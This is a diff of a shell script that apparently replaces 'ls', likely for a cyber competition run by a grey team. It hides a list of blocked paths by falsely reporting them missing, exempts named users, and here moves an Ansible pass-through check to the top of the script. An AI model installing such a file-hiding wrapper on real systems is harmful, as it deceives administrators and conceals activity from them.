@@ -6,6 +6,10 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_LS "$@" ;;
 esac
 
+# Pass straight through if running under Ansible
+if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
+    exec $REAL_LS "$@"
+fi
 
 # Paths that are fully blocked — ls on these returns "no such file or directory"
 BLOCKED_PATHS=(
@@ -31,11 +35,6 @@ _is_blocked() {
     for p in "${BLOCKED_PATHS[@]}"; do
         [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
     done
-
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_LS "$@"
-fi
     return 1
 }
 
